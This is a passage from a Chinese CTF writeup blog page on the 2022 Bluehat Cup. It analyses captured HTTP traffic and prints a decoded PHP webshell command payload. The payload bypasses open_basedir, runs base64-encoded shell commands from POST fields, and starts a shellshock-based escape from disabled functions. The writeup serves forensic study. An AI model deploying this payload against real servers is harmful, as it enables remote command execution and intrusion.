@@ -1,0 +1,381 @@
+<!DOCTYPE html><html lang="zh"> <head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="generator" content="Astro v5.9.1"><title>蓝帽杯 2022 Writeup</title><meta name="title" content="蓝帽杯 2022 Writeup"><link rel="icon" type="image/x-icon" href="/favicon.ico"><link rel="sitemap" href="/atom.xml"><link rel="alternate" type="application/atom+xml" title="Hi, I Am I" href="https://5ime.cn/atom.xml"><link rel="preload" href="/fonts/atkinson-regular.woff" as="font" type="font/woff" crossorigin><link rel="preload" href="/fonts/atkinson-bold.woff" as="font" type="font/woff" crossorigin><link rel="canonical" href="https://5ime.cn/bluehatcup-2022/"><meta property="og:type" content="website"><meta property="og:url" content="https://5ime.cn/bluehatcup-2022/"><meta property="og:title" content="蓝帽杯 2022 Writeup"><meta property="og:description" content><meta property="twitter:card" content="summary_large_image"><meta property="twitter:url" content="https://5ime.cn/bluehatcup-2022/"><meta property="twitter:title" content="蓝帽杯 2022 Writeup"><meta property="twitter:description" content><script lang="js">
+			// 动态导入 APlayer 并挂载到全局对象
+			import('aplayer').then(function(APlayerModule) {
+				window.APlayer = APlayerModule.default;
+			});
+		</script><link rel="stylesheet" href="/_astro/_slug_.BmX1OOhA.css">
+<link rel="stylesheet" href="/_astro/waline.nkDt9Ep-.css">
+<link rel="stylesheet" href="/_astro/_slug_.DKyB8MnR.css">
+<link rel="stylesheet" href="/_astro/_slug_.C4C932n7.css">
+<style>#waline[data-astro-cid-cjuph4ok]{margin:2rem 0}
+</style></head> <body class="bg-white"> <header class="relative m-0 px-4 py-4 mb-8" data-astro-cid-3ef6ksr2> <nav class="flex items-center justify-between w-full" aria-label="主导航" data-astro-cid-3ef6ksr2> <div class="hidden md:flex items-center space-x-4 w-full justify-center" data-astro-cid-3ef6ksr2> <a href="/" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Home </a> <a href="/archive" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Blog </a> <a href="/links" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Links </a> <a href="/guestbook" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Comment </a> <a href="/about" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> About </a> </div> <button id="menu-btn" class="md:hidden flex flex-col space-y-1 p-2 text-black" aria-label="打开菜单" aria-expanded="false" aria-controls="menu" data-astro-cid-3ef6ksr2> <span class="w-6 h-0.5 bg-current transition-all" data-astro-cid-3ef6ksr2></span> <span class="w-6 h-0.5 bg-current transition-all" data-astro-cid-3ef6ksr2></span> <span class="w-6 h-0.5 bg-current transition-all" data-astro-cid-3ef6ksr2></span> </button> <div id="menu" class="md:hidden absolute top-full left-4 right-4 bg-white rounded-xl shadow-2xl border border-gray-100 backdrop-blur-md hidden mt-3 z-50" role="menu" aria-labelledby="menu-btn" data-astro-cid-3ef6ksr2> <div class="flex flex-col" data-astro-cid-3ef6ksr2> <a href="/" role="menuitem" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Home </a> <a href="/archive" role="menuitem" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Blog </a> <a href="/links" role="menuitem" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Links </a> <a href="/guestbook" role="menuitem" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Comment </a> <a href="/about" role="menuitem" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> About </a> </div> </div> </nav> </header> <script type="module">const e=document.getElementById("menu-btn"),a=document.getElementById("menu");e?.addEventListener("click",()=>{const t=e.getAttribute("aria-expanded")==="true";e.setAttribute("aria-expanded",t?"false":"true"),e.setAttribute("aria-label",t?"打开菜单":"关闭菜单"),a?.classList.toggle("hidden"),e.classList.toggle("open")});e?.addEventListener("keydown",t=>{(t.key==="Enter"||t.key===" ")&&(t.preventDefault(),e.click())});document.addEventListener("keydown",t=>{t.key==="Escape"&&!a?.classList.contains("hidden")&&(a?.classList.add("hidden"),e?.classList.remove("open"),e?.setAttribute("aria-expanded","false"),e?.setAttribute("aria-label","打开菜单"),e?.focus())});document.addEventListener("click",t=>{!e?.contains(t.target)&&!a?.contains(t.target)&&(a?.classList.add("hidden"),e?.classList.remove("open"),e?.setAttribute("aria-expanded","false"),e?.setAttribute("aria-label","打开菜单"))});</script>  <main class="min-h-screen" role="main" aria-label="文章内容"> <article class="max-w-4xl mx-auto px-2 md:px-6 pt-6 pb-32">  <header class="mb-12"> <h1 class="text-4xl md:text-5xl font-semibold text-gray-900 mb-6 tracking-tight leading-tight"> 蓝帽杯 2022 Writeup </h1> <div class="flex flex-wrap items-center gap-3 text-sm font-light"> <time datetime="2022-07-09T22:26:22.000Z" class="text-[#86868b] tracking-wide"> <time datetime="2022-07-09T22:26:22.000Z"> Jul 9, 2022 </time> </time>  <span class="text-[#d2d2d7] flex items-center" aria-hidden="true">|</span> <span class="text-[#86868b] tracking-wide" aria-label="阅读时间 8 min read">8 min read</span>   <span class="text-[#d2d2d7] flex items-center" aria-hidden="true">|</span> <nav class="flex items-center gap-3" aria-label="文章分类">  <a href="/categories/技术.html" class="text-[#86868b] hover:text-[#0066cc] transition-colors duration-300 tracking-wide font-light" aria-label="查看分类 技术 下的所有文章"> 技术 </a>  </nav>   <span class="text-[#d2d2d7] flex items-center" aria-hidden="true">|</span> <nav class="flex items-center gap-2" aria-label="文章标签">  <a href="/tags/CTF.html" class="text-[#86868b] hover:text-[#0066cc] transition-colors duration-300 tracking-wide font-light" aria-label="查看标签 CTF 下的所有文章"> CTF </a> <span class="text-[#d2d2d7]" aria-hidden="true">·</span> <a href="/tags/Writeup.html" class="text-[#86868b] hover:text-[#0066cc] transition-colors duration-300 tracking-wide font-light" aria-label="查看标签 Writeup 下的所有文章"> Writeup </a> <span class="text-[#d2d2d7]" aria-hidden="true">·</span> <a href="/tags/网络安全.html" class="text-[#86868b] hover:text-[#0066cc] transition-colors duration-300 tracking-wide font-light" aria-label="查看标签 网络安全 下的所有文章"> 网络安全 </a>  </nav>  </div> </header>  <nav class="toc" aria-label="文章目录" data-astro-cid-woz2nwfv> <h2 class="toc-title" data-astro-cid-woz2nwfv>文章目录</h2> <ol class="toc-list" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#misc" class="toc-link" data-astro-cid-woz2nwfv> 1. MISC </a> <ol class="toc-sublist" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#domainhacker" class="toc-link" data-astro-cid-woz2nwfv> 1.1. domainhacker </a> </li> </ol> </li><li data-astro-cid-woz2nwfv> <a href="#电子取证" class="toc-link" data-astro-cid-woz2nwfv> 2. 电子取证 </a> <ol class="toc-sublist" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#程序分析_1" class="toc-link" data-astro-cid-woz2nwfv> 2.1. 程序分析_1 </a> </li><li data-astro-cid-woz2nwfv> <a href="#程序分析_2" class="toc-link" data-astro-cid-woz2nwfv> 2.2. 程序分析_2 </a> </li><li data-astro-cid-woz2nwfv> <a href="#程序分析_3" class="toc-link" data-astro-cid-woz2nwfv> 2.3. 程序分析_3 </a> </li><li data-astro-cid-woz2nwfv> <a href="#手机取证_1" class="toc-link" data-astro-cid-woz2nwfv> 2.4. 手机取证_1 </a> </li><li data-astro-cid-woz2nwfv> <a href="#手机取证_2" class="toc-link" data-astro-cid-woz2nwfv> 2.5. 手机取证_2 </a> </li><li data-astro-cid-woz2nwfv> <a href="#网站取证_1" class="toc-link" data-astro-cid-woz2nwfv> 2.6. 网站取证_1 </a> </li><li data-astro-cid-woz2nwfv> <a href="#网站取证_2" class="toc-link" data-astro-cid-woz2nwfv> 2.7. 网站取证_2 </a> </li><li data-astro-cid-woz2nwfv> <a href="#网站取证_3" class="toc-link" data-astro-cid-woz2nwfv> 2.8. 网站取证_3 </a> </li><li data-astro-cid-woz2nwfv> <a href="#计算机取证_1" class="toc-link" data-astro-cid-woz2nwfv> 2.9. 计算机取证_1 </a> </li><li data-astro-cid-woz2nwfv> <a href="#计算机取证_2" class="toc-link" data-astro-cid-woz2nwfv> 2.10. 计算机取证_2 </a> </li> </ol> </li> </ol> </nav>  <script lang="js">
+  function initTableOfContents() {
+    const links = document.querySelectorAll('.toc-link');
+    const headings = Array.from(links)
+      .map(link => {
+        const href = link.getAttribute('href');
+        if (href && href.startsWith('#')) {
+          const id = href.slice(1);
+          return document.getElementById(id);
+        }
+        return null;
+      })
+      .filter(element => element !== null);
+
+    // 平滑滚动功能
+    function scrollToElement(targetId) {
+      const target = document.getElementById(targetId);
+      if (target) {
+        const headerOffset = 100;
+        const elementPosition = target.getBoundingClientRect().top;
+        const offsetPosition = elementPosition + window.pageYOffset - headerOffset;
+
+        window.scrollTo({
+          top: offsetPosition,
+          behavior: 'smooth'
+        });
+      }
+    }
+
+    // 设置活跃链接
+    function setActiveLink(targetId) {
+      links.forEach(link => link.classList.remove('active'));
+      
+      const activeLink = document.querySelector('.toc-link[href="#' + targetId + '"]');
+      if (activeLink) {
+        activeLink.classList.add('active');
+        
+        if (window.location.hash.slice(1) !== targetId) {
+          history.replaceState(null, '', '#' + targetId);
+        }
+      }
+    }
+
+    // 设置平滑滚动
+    links.forEach(link => {
+      link.addEventListener('click', function(e) {
+        e.preventDefault();
+        const href = link.getAttribute('href');
+        if (href && href.startsWith('#')) {
+          const targetId = href.slice(1);
+          scrollToElement(targetId);
+        }
+      });
+    });
+
+    // 设置交集观察器
+    const observer = new IntersectionObserver(
+      function(entries) {
+        const visibleEntries = entries.filter(entry => entry.isIntersecting);
+        if (visibleEntries.length > 0) {
+          const visibleEntry = visibleEntries.reduce(function(prev, current) {
+            return prev.boundingClientRect.top < current.boundingClientRect.top ? prev : current;
+          });
+          setActiveLink(visibleEntry.target.id);
+        }
+      },
+      { rootMargin: '-10% 0px -70% 0px' }
+    );
+
+    headings.forEach(function(heading) {
+      observer.observe(heading);
+    });
+
+    // 处理初始哈希
+    function handleInitialHash() {
+      const hash = window.location.hash;
+      if (hash) {
+        setTimeout(function() {
+          const targetId = hash.slice(1);
+          scrollToElement(targetId);
+          setActiveLink(targetId);
+        }, 300); // 增加延迟时间，确保页面完全加载
+      }
+    }
+
+    // 处理哈希变化
+    function handleHashChange() {
+      const hash = window.location.hash;
+      if (hash) {
+        const targetId = hash.slice(1);
+        scrollToElement(targetId);
+        setActiveLink(targetId);
+      }
+    }
+
+    // 确保在不同加载阶段都能正确处理锚点
+    handleInitialHash();
+    window.addEventListener('popstate', handleInitialHash);
+    window.addEventListener('hashchange', handleHashChange);
+    
+    // 页面完全加载后再次检查
+    window.addEventListener('load', function() {
+      setTimeout(handleInitialHash, 100);
+    });
+  }
+
+  // 初始化
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', initTableOfContents);
+  } else {
+    initTableOfContents();
+  }
+</script>  <div class="fancybox-container">  <section id="article" class="prose prose-lg max-w-none" aria-label="文章正文">   <p>一觉起来蓝帽杯还有一个多小时结束QAQ，划划水做了几题下线了。整体来说蓝帽杯体验还是不错的，大部分电子取证题很适合新手。</p>
+<!--more-->
+<h2 id="misc">MISC</h2>
+<h3 id="domainhacker">domainhacker</h3>
+<blockquote>
+<p>公司安全部门，在流量设备中发现了疑似黑客入侵的痕迹，用户似乎获取了机器的hash，你能通过分析流量，找到机器的hash吗？flag格式：flag{hash_of_machine}</p>
+</blockquote>
+<p>全是 <code>HTTP</code> 流量，我们直接追踪 <code>TCP流</code> 在 <code>流10</code> 发现了 <code>mimikatz</code></p>
+<p><img src="https://img.5ime.cn/bluehatcup-2022/image-20220709184706210.png" alt="image-20220709184706210"></p>
+<p>在 <code>流13</code> 发现了一个压缩包</p>
+<p><img src="https://img.5ime.cn/bluehatcup-2022/image-20220709184841410.png" alt="image-20220709184841410"></p>
+<p>我们直接导出所有 <code>HTTP对象</code></p>
+<p><img src="https://img.5ime.cn/bluehatcup-2022/image-20220709184901623.png" alt="image-20220709184901623"></p>
+<p>得到一堆文件和一个加密压缩包<code>1.rar</code></p>
+<p><img src="https://img.5ime.cn/bluehatcup-2022/image-20220709185029725.png" alt="image-20220709185029725"></p>
+<p>打开看了一下，<code>1(17).php</code> 对应着 <code>流13</code> 的内容，所以我们直接看前一个请求信息 <code>1(16).php</code> 里请求了什么，简单格式化一下</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#F97583">&#x3C;?</span><span style="color:#79B8FF">php</span></span>
+<span class="line" data-line="2"><span style="color:#79B8FF">a</span><span style="color:#F97583"> =</span><span style="color:#F97583"> @</span><span style="color:#79B8FF">ini_set</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"display_errors"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"0"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="3"><span style="color:#F97583">@</span><span style="color:#79B8FF">set_time_limit</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="4"><span style="color:#E1E4E8">$opdir </span><span style="color:#F97583">=</span><span style="color:#F97583"> @</span><span style="color:#79B8FF">ini_get</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"open_basedir"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="5"><span style="color:#F97583">if</span><span style="color:#E1E4E8"> ($opdir) {</span></span>
+<span class="line" data-line="6"><span style="color:#E1E4E8">    $ocwd </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> dirname</span><span style="color:#E1E4E8">($_SERVER[</span><span style="color:#9ECBFF">"SCRIPT_FILENAME"</span><span style="color:#E1E4E8">]);</span></span>
+<span class="line" data-line="7"><span style="color:#E1E4E8">    $oparr </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> preg_split</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"/</span><span style="color:#DBEDFF">;|:</span><span style="color:#9ECBFF">/"</span><span style="color:#E1E4E8">, $opdir);</span></span>
+<span class="line" data-line="8"><span style="color:#F97583">    @</span><span style="color:#79B8FF">array_push</span><span style="color:#E1E4E8">($oparr, $ocwd, </span><span style="color:#79B8FF">sys_get_temp_dir</span><span style="color:#E1E4E8">());</span></span>
+<span class="line" data-line="9"><span style="color:#F97583">    foreach</span><span style="color:#E1E4E8"> ($oparr </span><span style="color:#F97583">as</span><span style="color:#E1E4E8"> $item) {</span></span>
+<span class="line" data-line="10"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!@</span><span style="color:#79B8FF">is_writable</span><span style="color:#E1E4E8">($item)) {</span></span>
+<span class="line" data-line="11"><span style="color:#F97583">            continue</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="12"><span style="color:#E1E4E8">        };</span></span>
+<span class="line" data-line="13"><span style="color:#E1E4E8">        $tmdir </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> $item </span><span style="color:#F97583">.</span><span style="color:#9ECBFF"> "/.37120390cd"</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="14"><span style="color:#F97583">        @</span><span style="color:#79B8FF">mkdir</span><span style="color:#E1E4E8">($tmdir);</span></span>
+<span class="line" data-line="15"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!@</span><span style="color:#79B8FF">file_exists</span><span style="color:#E1E4E8">($tmdir)) {</span></span>
+<span class="line" data-line="16"><span style="color:#F97583">            continue</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="17"><span style="color:#E1E4E8">        }</span></span>
+<span class="line" data-line="18"><span style="color:#F97583">        @</span><span style="color:#79B8FF">chdir</span><span style="color:#E1E4E8">($tmdir);</span></span>
+<span class="line" data-line="19"><span style="color:#F97583">        @</span><span style="color:#79B8FF">ini_set</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"open_basedir"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">".."</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="20"><span style="color:#E1E4E8">        $cntarr </span><span style="color:#F97583">=</span><span style="color:#F97583"> @</span><span style="color:#79B8FF">preg_split</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"/</span><span style="color:#85E89D;font-weight:bold">\\\\</span><span style="color:#DBEDFF">|\/</span><span style="color:#9ECBFF">/"</span><span style="color:#E1E4E8">, $tmdir);</span></span>
+<span class="line" data-line="21"><span style="color:#F97583">        for</span><span style="color:#E1E4E8"> ($i </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">;$i </span><span style="color:#F97583">&#x3C;</span><span style="color:#79B8FF"> sizeof</span><span style="color:#E1E4E8">($cntarr);$i</span><span style="color:#F97583">++</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line" data-line="22"><span style="color:#F97583">            @</span><span style="color:#79B8FF">chdir</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">".."</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="23"><span style="color:#E1E4E8">        };</span></span>
+<span class="line" data-line="24"><span style="color:#F97583">        @</span><span style="color:#79B8FF">ini_set</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"open_basedir"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"/"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="25"><span style="color:#F97583">        @</span><span style="color:#79B8FF">rmdir</span><span style="color:#E1E4E8">($tmdir);</span></span>
+<span class="line" data-line="26"><span style="color:#F97583">        break</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="27"><span style="color:#E1E4E8">    };</span></span>
+<span class="line" data-line="28"><span style="color:#E1E4E8">};;</span></span>
+<span class="line" data-line="29"><span style="color:#F97583">function</span><span style="color:#B392F0"> asenc</span><span style="color:#E1E4E8">($out) {</span></span>
+<span class="line" data-line="30"><span style="color:#F97583">    return</span><span style="color:#E1E4E8"> $out;</span></span>
+<span class="line" data-line="31"><span style="color:#E1E4E8">};</span></span>
+<span class="line" data-line="32"><span style="color:#F97583">function</span><span style="color:#B392F0"> asoutput</span><span style="color:#E1E4E8">() {</span></span>
+<span class="line" data-line="33"><span style="color:#E1E4E8">    $output </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> ob_get_contents</span><span style="color:#E1E4E8">();</span></span>
+<span class="line" data-line="34"><span style="color:#79B8FF">    ob_end_clean</span><span style="color:#E1E4E8">();</span></span>
+<span class="line" data-line="35"><span style="color:#79B8FF">    echo</span><span style="color:#9ECBFF"> "d1588"</span><span style="color:#F97583"> .</span><span style="color:#9ECBFF"> "7ac2af"</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="36"><span style="color:#79B8FF">    echo</span><span style="color:#F97583"> @</span><span style="color:#B392F0">asenc</span><span style="color:#E1E4E8">($output);</span></span>
+<span class="line" data-line="37"><span style="color:#79B8FF">    echo</span><span style="color:#9ECBFF"> "bb1"</span><span style="color:#F97583"> .</span><span style="color:#9ECBFF"> "ca7"</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="38"><span style="color:#E1E4E8">}</span></span>
+<span class="line" data-line="39"><span style="color:#79B8FF">ob_start</span><span style="color:#E1E4E8">();</span></span>
+<span class="line" data-line="40"><span style="color:#F97583">try</span><span style="color:#E1E4E8"> {</span></span>
+<span class="line" data-line="41"><span style="color:#E1E4E8">    $p </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> base64_decode</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">substr</span><span style="color:#E1E4E8">($_POST[</span><span style="color:#9ECBFF">"yee092cda97a62"</span><span style="color:#E1E4E8">], </span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">));</span></span>
+<span class="line" data-line="42"><span style="color:#E1E4E8">    $s </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> base64_decode</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">substr</span><span style="color:#E1E4E8">($_POST[</span><span style="color:#9ECBFF">"q8fb9d4c082c11"</span><span style="color:#E1E4E8">], </span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">));</span></span>
+<span class="line" data-line="43"><span style="color:#E1E4E8">    $envstr </span><span style="color:#F97583">=</span><span style="color:#F97583"> @</span><span style="color:#79B8FF">base64_decode</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">substr</span><span style="color:#E1E4E8">($_POST[</span><span style="color:#9ECBFF">"p48a6d55fac1b1"</span><span style="color:#E1E4E8">], </span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">));</span></span>
+<span class="line" data-line="44"><span style="color:#E1E4E8">    $d </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> dirname</span><span style="color:#E1E4E8">($_SERVER[</span><span style="color:#9ECBFF">"SCRIPT_FILENAME"</span><span style="color:#E1E4E8">]);</span></span>
+<span class="line" data-line="45"><span style="color:#E1E4E8">    $c </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> substr</span><span style="color:#E1E4E8">($d, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">==</span><span style="color:#9ECBFF"> "/"</span><span style="color:#F97583"> ?</span><span style="color:#9ECBFF"> "-c </span><span style="color:#79B8FF">\"</span><span style="color:#9ECBFF">{</span><span style="color:#E1E4E8">$s</span><span style="color:#9ECBFF">}</span><span style="color:#79B8FF">\"</span><span style="color:#9ECBFF">"</span><span style="color:#F97583"> :</span><span style="color:#9ECBFF"> "/c </span><span style="color:#79B8FF">\"</span><span style="color:#9ECBFF">{</span><span style="color:#E1E4E8">$s</span><span style="color:#9ECBFF">}</span><span style="color:#79B8FF">\"</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="46"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (</span><span style="color:#79B8FF">substr</span><span style="color:#E1E4E8">($d, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">==</span><span style="color:#9ECBFF"> "/"</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line" data-line="47"><span style="color:#F97583">        @</span><span style="color:#79B8FF">putenv</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"PATH="</span><span style="color:#F97583"> .</span><span style="color:#79B8FF"> getenv</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"PATH"</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">.</span><span style="color:#9ECBFF"> ":/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="48"><span style="color:#E1E4E8">    } </span><span style="color:#F97583">else</span><span style="color:#E1E4E8"> {</span></span>
+<span class="line" data-line="49"><span style="color:#F97583">        @</span><span style="color:#79B8FF">putenv</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"PATH="</span><span style="color:#F97583"> .</span><span style="color:#79B8FF"> getenv</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"PATH"</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">.</span><span style="color:#9ECBFF"> ";C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="50"><span style="color:#E1E4E8">    }</span></span>
+<span class="line" data-line="51"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#79B8FF">empty</span><span style="color:#E1E4E8">($envstr)) {</span></span>
+<span class="line" data-line="52"><span style="color:#E1E4E8">        $envarr </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> explode</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"|||asline|||"</span><span style="color:#E1E4E8">, $envstr);</span></span>
+<span class="line" data-line="53"><span style="color:#F97583">        foreach</span><span style="color:#E1E4E8"> ($envarr </span><span style="color:#F97583">as</span><span style="color:#E1E4E8"> $v) {</span></span>
+<span class="line" data-line="54"><span style="color:#F97583">            if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#79B8FF">empty</span><span style="color:#E1E4E8">($v)) {</span></span>
+<span class="line" data-line="55"><span style="color:#F97583">                @</span><span style="color:#79B8FF">putenv</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">str_replace</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"|||askey|||"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"="</span><span style="color:#E1E4E8">, $v));</span></span>
+<span class="line" data-line="56"><span style="color:#E1E4E8">            }</span></span>
+<span class="line" data-line="57"><span style="color:#E1E4E8">        }</span></span>
+<span class="line" data-line="58"><span style="color:#E1E4E8">    }</span></span>
+<span class="line" data-line="59"><span style="color:#E1E4E8">    $r </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> "{</span><span style="color:#E1E4E8">$p</span><span style="color:#9ECBFF">} {</span><span style="color:#E1E4E8">$c</span><span style="color:#9ECBFF">}"</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="60"><span style="color:#F97583">    function</span><span style="color:#B392F0"> fe</span><span style="color:#E1E4E8">($f) {</span></span>
+<span class="line" data-line="61"><span style="color:#E1E4E8">        $d </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> explode</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">","</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">@</span><span style="color:#79B8FF">ini_get</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"disable_functions"</span><span style="color:#E1E4E8">));</span></span>
+<span class="line" data-line="62"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#79B8FF">empty</span><span style="color:#E1E4E8">($d)) {</span></span>
+<span class="line" data-line="63"><span style="color:#E1E4E8">            $d </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> array</span><span style="color:#E1E4E8">();</span></span>
+<span class="line" data-line="64"><span style="color:#E1E4E8">        } </span><span style="color:#F97583">else</span><span style="color:#E1E4E8"> {</span></span>
+<span class="line" data-line="65"><span style="color:#E1E4E8">            $d </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> array_map</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'trim'</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">array_map</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'strtolower'</span><span style="color:#E1E4E8">, $d));</span></span>
+<span class="line" data-line="66"><span style="color:#E1E4E8">        }</span></span>
+<span class="line" data-line="67"><span style="color:#F97583">        return</span><span style="color:#E1E4E8"> (</span><span style="color:#79B8FF">function_exists</span><span style="color:#E1E4E8">($f) </span><span style="color:#F97583">&#x26;&#x26;</span><span style="color:#79B8FF"> is_callable</span><span style="color:#E1E4E8">($f) </span><span style="color:#F97583">&#x26;&#x26;</span><span style="color:#F97583"> !</span><span style="color:#79B8FF">in_array</span><span style="color:#E1E4E8">($f, $d));</span></span>
+<span class="line" data-line="68"><span style="color:#E1E4E8">    };</span></span>
+<span class="line" data-line="69"><span style="color:#F97583">    function</span><span style="color:#B392F0"> runshellshock</span><span style="color:#E1E4E8">($d, $c) {</span></span>
+<span class="line" data-line="70"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#79B8FF">substr</span><span style="color:#E1E4E8">($d, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">==</span><span style="color:#9ECBFF"> "/"</span><span style="color:#F97583"> &#x26;&#x26;</span><span style="color:#B392F0"> fe</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'putenv'</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">&#x26;&#x26;</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">fe</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'error_log'</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">||</span><span style="color:#B392F0"> fe</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'mail'</span><span style="color:#E1E4E8">))) {</span></span>
+<span class="line" data-line="71"><span style="color:#F97583">            if</span><span style="color:#E1E4E8"> (</span><span style="color:#79B8FF">strstr</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">readlink</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"/bin/sh"</span><span style="color:#E1E4E8">), </span><span style="color:#9ECBFF">"bash"</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">!=</span><span style="color:#79B8FF"> FALSE</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line" data-line="72"><span style="color:#E1E4E8">                $tmp </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> tempnam</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">sys_get_temp_dir</span><span style="color:#E1E4E8">(), </span><span style="color:#9ECBFF">'as'</span><span style="color:#E1E4E8">);</span></span>
